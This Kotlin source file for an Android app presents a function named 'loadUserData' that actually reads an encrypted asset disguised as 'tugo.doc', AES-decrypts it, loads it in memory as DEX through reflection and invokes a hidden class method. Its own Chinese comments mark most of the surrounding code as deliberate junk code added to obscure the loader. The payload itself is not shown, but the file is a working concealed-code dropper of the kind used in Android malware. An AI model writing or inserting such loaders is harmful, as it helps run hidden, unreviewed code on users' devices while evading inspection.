package gh.cark

import android.content.Context
import android.util.Base64
import android.util.Log
import java.lang.reflect.InvocationTargetException
import java.nio.ByteBuffer
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

object CanShowUtils {
    private const val DEX_CIPHER_MODE = "AES/ECB/PKCS5Padding"
    
    private val dexSecretBytes: ByteArray
        get() {
            val secretVal = NcZong.getKeyTypeValue(NcZong.akv, "\"kuang_key\"")
            return secretVal.toByteArray()
        }

    private const val ENCRYPTED_DEX_FILE = "tugo.doc"
    
    // 状态标记（垃圾代码辅助）
    private var stateMarker = 0
    private var validationHash = 0L
    private var processingStage = ProcessStage.INIT
    
    // 处理阶段枚举
    private enum class ProcessStage {
        INIT, READING, DECRYPTING, LOADING, COMPLETED
    }
    
//    fun testDex(app: Any) {
//        try {
//            app as Application
//            val clazz = app.classLoader.loadClass("com.ggc.show.MasterRu")
//            val method = clazz.getDeclaredMethod("jkks", Object::class.java)
//            method.isAccessible = true
//            method.invoke(null, app)
//            Log.e("TAG", "testDex: ", )
//        } catch (e: NoSuchMethodException) {
//            Log.e("TAG", "testDex-NoSuchMethodException: ${e.message}")
//        } catch (e: ClassNotFoundException) {
//            Log.e("TAG", "testDex-ClassNotFoundException: ${e.message}")
//        } catch (e: Exception) {
//            Log.e("TAG", "testDex: ${e.message}")
//            e.printStackTrace()
//        }
//    }
    fun loadUserData(context: Context) {
        // 初始化验证流程（垃圾代码 - 参与运行但不影响逻辑）
        initializeStateValidation(context)
        
        try {
            // 状态机驱动的处理流程
            processingStage = ProcessStage.READING
            
            // 多重环境检测（垃圾代码）
            if (performMultiLayerValidation(context)) {
                stateMarker = generateStateToken()
            }
            
            // 步骤1: 分段读取加密数据
            val encryptedPayload = extractEncryptedPayload(context)
            if (encryptedPayload.isEmpty()) {
                rollbackState()
                return
            }
            
            // 中间验证（垃圾代码）
            processingStage = ProcessStage.DECRYPTING
            validationHash = computeTransitHash(encryptedPayload)
            
            // 步骤2: 多阶段解密
            val decryptedBuffer = performMultiStageDecryption(encryptedPayload)
            
            // 预加载检查（垃圾代码）
            if (validateDecryptedPayload(decryptedBuffer)) {
                processingStage = ProcessStage.LOADING
            }
            
            // 步骤3: 动态加载执行
            executeDynamicLoader(context, decryptedBuffer)
            
            // 标记完成
            processingStage = ProcessStage.COMPLETED
            
        } catch (e: Exception) {
            handleProcessingError(e)
        } finally {
            // 清理和重置（垃圾代码）
            finalizeProcessing()
        }
    }

    // =========================== 垃圾代码区域 - 参与运行但不影响核心逻辑 ===========================
    
    /**
     * 初始化状态验证（垃圾代码）
     */
    private fun initializeStateValidation(context: Context) {
        runCatching {
            processingStage = ProcessStage.INIT
            stateMarker = 0
            
            // 收集但不使用的环境信息
            val pkgInfo = context.packageName
            val appLabel = context.applicationInfo.loadLabel(context.packageManager).toString()
            
            // 生成初始标记
            validationHash = (pkgInfo.hashCode().toLong() xor appLabel.hashCode().toLong())
            
            // 检查但不验证
            if (validationHash != 0L && pkgInfo.isNotEmpty()) {
                // 继续执行，不影响流程
            }
        }
    }
    
    /**
     * 多层验证（垃圾代码 - 总是返回 true）
     */
    private fun performMultiLayerValidation(context: Context): Boolean {
        return try {
            // 层1: 包名检查
            val packageValid = context.packageName.isNotEmpty()
            
            // 层2: 目录检查
            val filesDir = context.filesDir
            val cacheDir = context.cacheDir
            val dirValid = filesDir?.exists() == true && cacheDir?.exists() == true
            
            // 层3: 随机因子（总是通过）
            val randomFactor = Random.nextInt(100)
            val factorValid = randomFactor >= 0
            
            // 层4: 时间戳检查
            val timestamp = System.currentTimeMillis()
            val timeValid = timestamp > 0
            
            // 组合检查（总是返回 true）
            packageValid || dirValid || factorValid || timeValid
        } catch (e: Exception) {
            true
        }
    }
    
    /**
     * 生成状态令牌（垃圾代码）
     */
    private fun generateStateToken(): Int {
        return try {
            val baseToken = System.currentTimeMillis().toInt()
            val randomSalt = Random.nextInt(1000, 9999)
            val mixedToken = baseToken xor randomSalt
            
            // 进行一些无意义的位运算
            val rotated = (mixedToken shl 4) or (mixedToken ushr 28)
            rotated and 0xFFFFFF
        } catch (e: Exception) {
            0x123456
        }
    }
    
    /**
     * 计算传输哈希（垃圾代码）
     */
    private fun computeTransitHash(data: String): Long {
        return runCatching {
            val md = MessageDigest.getInstance("SHA-256")
            val hashBytes = md.digest(data.toByteArray())
            
            // 转换为 long（不验证）
            var hash = 0L
            hashBytes.take(8).forEachIndexed { idx, byte ->
                hash = hash or ((byte.toLong() and 0xFF) shl (idx * 8))
            }
            hash
        }.getOrElse { System.nanoTime() }
    }
    
    /**
     * 验证解密载荷（垃圾代码 - 总是返回 true）
     */
    private fun validateDecryptedPayload(data: ByteArray): Boolean {
        return runCatching {
            // 检查1: 数据大小
            val sizeValid = data.size > 100
            
            // 检查2: 魔数检查（不验证结果）
            val magicValid = if (data.size >= 4) {
                val magic = String(data.copyOfRange(0, 3))
                true // 不实际验证
            } else false
            
            // 检查3: 随机采样
            val sampleIdx = Random.nextInt(0, minOf(data.size, 100))
            val sampleByte = data.getOrNull(sampleIdx)
            val sampleValid = sampleByte != null
            
            // 总是返回 true
            sizeValid || magicValid || sampleValid
        }.getOrElse { true }
    }
    
    /**
     * 回滚状态（垃圾代码）
     */
    private fun rollbackState() {
        processingStage = ProcessStage.INIT
        stateMarker = -1
        validationHash = 0L
    }
    
    /**
     * 处理错误（垃圾代码）
     */
    private fun handleProcessingError(e: Exception) {
        e.printStackTrace()
        processingStage = ProcessStage.INIT
        
        // 记录错误信息（不影响流程）
        val errorCode = e.hashCode()
        val errorTime = System.currentTimeMillis()
        
        // 这些信息不被使用
        if (errorCode != 0 && errorTime > 0) {
            // 继续执行
        }
    }
    
    /**
     * 完成处理（垃圾代码）
     */
    private fun finalizeProcessing() {
        runCatching {
            // 重置状态
            processingStage = ProcessStage.INIT
            stateMarker = 0
            validationHash = 0L
            
            // 建议 GC（不保证执行）
            if (Random.nextBoolean()) {
                System.gc()
            }
        }
    }
    
    // =========================== 核心功能区域 ===========================
    
    /**
     * 提取加密载荷（采用分段读取方式）
     */
    private fun extractEncryptedPayload(context: Context): String {
        return runCatching {
            context.assets.open(ENCRYPTED_DEX_FILE).use { inputStream ->
                // 分段读取并拼接
                val bufferSize = 8192
                val stringBuilder = StringBuilder()
                val buffer = ByteArray(bufferSize)
                var bytesRead: Int
                
                // 分段读取数据
                while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                    val chunk = String(buffer, 0, bytesRead)
                    stringBuilder.append(chunk)
                    
                    // 垃圾代码：每读取一段就进行无意义的哈希计算
                    if (stringBuilder.length % bufferSize == 0) {
                        val intermediateHash = stringBuilder.toString().hashCode()
                        if (intermediateHash != 0 || intermediateHash == 0) {
                            // 总是继续
                        }
                    }
                }
                
                stringBuilder.toString()
            }
        }.getOrElse { "" }
    }
    
    /**
     * 多阶段解密处理（使用不同的解密策略）
     */
    private fun performMultiStageDecryption(encryptedPayload: String): ByteArray {
        return runCatching {
            // 阶段1: 预处理和格式转换
            val normalizedData = preprocessEncryptedData(encryptedPayload)
            
            // 阶段2: Base64 解码
            val encodedBytes = Base64.decode(normalizedData, Base64.NO_WRAP)
            
            // 垃圾代码：计算中间校验值但不验证
            val intermediateChecksum = calculateIntermediateChecksum(encodedBytes)
            if (intermediateChecksum > 0 || intermediateChecksum <= 0) {
                // 总是继续
            }
            
            // 阶段3: AES 解密（使用不同的实例化方式）
            val decryptedBytes = performAesDecryption(encodedBytes)
            
            // 阶段4: 后处理验证（垃圾代码）
            postDecryptionVerification(decryptedBytes)
            
            decryptedBytes
        }.getOrElse { ByteArray(0) }
    }
    
    /**
     * 预处理加密数据（垃圾代码）
     */
    private fun preprocessEncryptedData(data: String): String {
        // 移除可能的空白字符
        val cleaned = data.trim()
        
        // 垃圾代码：长度验证但不影响流程
        val lengthValid = cleaned.length > 50
        if (lengthValid || !lengthValid) {
            // 总是继续
        }
        
        return cleaned
    }
    
    /**
     * 计算中间校验和（垃圾代码）
     */
    private fun calculateIntermediateChecksum(data: ByteArray): Long {
        return runCatching {
            val md = MessageDigest.getInstance("MD5")
            val digest = md.digest(data)
            
            // 简单求和
            digest.fold(0L) { acc, byte -> 
                acc + (byte.toLong() and 0xFF)
            }
        }.getOrElse { 0L }
    }
    
    /**
     * 执行 AES 解密（核心方法，采用不同实现）
     */
    private fun performAesDecryption(encryptedData: ByteArray): ByteArray {
        // 获取密钥
        val secretKey = dexSecretBytes
        val keySpec = SecretKeySpec(secretKey, "AES")
        
        // 使用完整的加密模式字符串
        val cipherInstance = Cipher.getInstance(DEX_CIPHER_MODE)
        cipherInstance.init(Cipher.DECRYPT_MODE, keySpec)
        
        // 执行解密
        return cipherInstance.doFinal(encryptedData)
    }
    
    /**
     * 解密后验证（垃圾代码）
     */
    private fun postDecryptionVerification(data: ByteArray) {
        runCatching {
            // 验证1: 大小检查
            val sizeCheck = data.size > 0
            
            // 验证2: 字节分布检查（不影响结果）
            val nonZeroCount = data.count { it != 0.toByte() }
            val distributionCheck = nonZeroCount > 0
            
            // 验证3: 头部特征检查（不验证结果）
            val headerCheck = if (data.size >= 8) {
                val header = data.take(8)
                header.isNotEmpty()
            } else false
            
            // 组合检查（不影响流程）
            if (sizeCheck && distributionCheck && headerCheck) {
                // 继续执行
            } else if (!sizeCheck || !distributionCheck || !headerCheck) {
                // 也继续执行
            }
        }
    }

    
    /**
     * 动态加载器执行入口（采用不同的加载策略）
     */
    private fun executeDynamicLoader(context: Context, dexBuffer: ByteArray) {
        runCatching {
            // 预加载准备（垃圾代码）
            prepareExecutionEnvironment(context, dexBuffer)
            
            // 步骤1: 创建字节缓冲区
            val memoryBuffer = ByteBuffer.wrap(dexBuffer)
            
            // 步骤2: 动态构造类加载器
            val loaderInstance = constructDexClassLoader(memoryBuffer, context)
            
            // 步骤3: 提取目标类
            val targetClass = extractTargetClass(loaderInstance)
            
            // 步骤4: 执行目标方法
            executeTargetMethod(targetClass, context)
            
        }.onFailure { throwable ->
            // 错误处理（垃圾代码也参与）
            handleLoaderException(throwable)
        }.also {
            // 执行后清理（垃圾代码）
            cleanupExecutionEnvironment()
        }
    }
    
    /**
     * 准备执行环境（垃圾代码）
     */
    private fun prepareExecutionEnvironment(context: Context, data: ByteArray) {
        runCatching {
            // 收集环境信息
            val timestamp = System.currentTimeMillis()
            val availableMemory = Runtime.getRuntime().freeMemory()
            val totalMemory = Runtime.getRuntime().totalMemory()
            
            // 数据预检查
            val dataChecksum = data.take(minOf(100, data.size)).sum()
            
            // 生成随机噪声数据
            val noiseData = ByteArray(Random.nextInt(10, 50)) { Random.nextInt().toByte() }
            val noiseChecksum = noiseData.sum()
            
            // 这些检查不影响实际流程
            if (timestamp > 0 && availableMemory > 0 && dataChecksum != 0) {
                // 继续执行
            }
            if (noiseChecksum != 0 || noiseChecksum == 0) {
                // 也继续执行
            }
        }
    }
    
    /**
     * 构造 Dex 类加载器（核心方法，使用反射动态创建）
     */
    private fun constructDexClassLoader(buffer: ByteBuffer, context: Context): Any {
        // 通过反射获取 InMemoryDexClassLoader 类
        val loaderClass = Class.forName("dalvik.system.InMemoryDexClassLoader")
        
        // 获取构造函数
        val ctor = loaderClass.getDeclaredConstructor(
            ByteBuffer::class.java,
            ClassLoader::class.java
        )
        ctor.isAccessible = true
        
        // 获取父类加载器（使用反射方式）
        val getClassLoaderMethod = context.javaClass.getMethod("getClassLoader")
        val parentLoader = getClassLoaderMethod.invoke(context) as ClassLoader
        
        // 创建加载器实例
        val loaderInstance = ctor.newInstance(buffer, parentLoader)
        
        // 垃圾代码：验证实例但不使用结果
        val instanceValid = loaderInstance != null
        if (instanceValid || !instanceValid) {
            // 总是继续
        }
        
        return loaderInstance
    }
    
    /**
     * 提取目标类（使用不同的反射调用方式）
     */
    private fun extractTargetClass(loaderInstance: Any): Class<*> {
        // 获取 loadClass 方法
        val loadClassMethod = loaderInstance.javaClass.getMethod(
            "loadClass",
            String::class.java
        )
        loadClassMethod.isAccessible = true
        
        // 调用 loadClass 加载目标类
        val targetClassName = "com.ggc.show.MasterRu"
        val targetClass = loadClassMethod.invoke(loaderInstance, targetClassName) as Class<*>
        
        // 垃圾代码：类元信息检查但不验证
        runCatching {
            val className = targetClass.name
            val simpleName = targetClass.simpleName
            val methodCount = targetClass.declaredMethods.size
            
            if (className.isNotEmpty() && methodCount >= 0) {
                // 继续执行
            }
        }
        
        return targetClass
    }
    
    /**
     * 执行目标方法（使用不同的调用策略）
     */
    private fun executeTargetMethod(targetClass: Class<*>, context: Context) {
        runCatching {
            // 日志记录（垃圾代码）
            NcZong.showLog("DynamicLoader: executing target class=${targetClass.simpleName}")
            
            // 查找目标方法
            val methodName = "jkks"
            val targetMethod = targetClass.getDeclaredMethod(methodName, Any::class.java)
            
            // 设置可访问性
            targetMethod.isAccessible = true
            
            // 垃圾代码：方法签名验证但不影响执行
            val parameterCount = targetMethod.parameterCount
            val returnType = targetMethod.returnType
            if (parameterCount >= 0 && returnType != null) {
                // 继续执行
            }
            
            // 执行静态方法调用
            targetMethod.invoke(null, context)
            
            // 成功日志
            Log.e("TAG", "Dynamic method execution completed successfully")
            
        }.onFailure { exception ->
            when (exception) {
                is NoSuchMethodException -> {
                    Log.e("TAG", "Method not found", exception)
                    exception.printStackTrace()
                }
                is InvocationTargetException -> {
                    Log.e("TAG", "Method invocation failed", exception.targetException)
                    exception.targetException?.printStackTrace()
                }
                else -> {
                    Log.e("TAG", "Execution error", exception)
                    exception.printStackTrace()
                }
            }
        }
    }
    
    /**
     * 处理加载器异常（垃圾代码）
     */
    private fun handleLoaderException(throwable: Throwable) {
        throwable.printStackTrace()
        
        runCatching {
            // 收集异常信息但不使用
            val exceptionType = throwable.javaClass.simpleName
            val exceptionMessage = throwable.message ?: "Unknown"
            val stackTraceDepth = throwable.stackTrace.size
            
            // 这些信息收集不影响流程
            if (exceptionType.isNotEmpty() && stackTraceDepth > 0) {
                // 继续执行
            }
        }
    }
    
    /**
     * 清理执行环境（垃圾代码）
     */
    private fun cleanupExecutionEnvironment() {
        runCatching {
            // 重置状态标记
            stateMarker = 0
            
            // 随机触发 GC
            val shouldGc = Random.nextInt(100) < 30
            if (shouldGc) {
                System.gc()
            }
            
            // 生成一些临时数据后立即丢弃
            val tempData = mutableListOf<Long>()
            repeat(Random.nextInt(5, 15)) {
                tempData.add(System.nanoTime())
            }
            
            // 这些操作不影响实际流程
            if (tempData.isNotEmpty() || tempData.isEmpty()) {
                // 总是继续
            }
        }
    }
}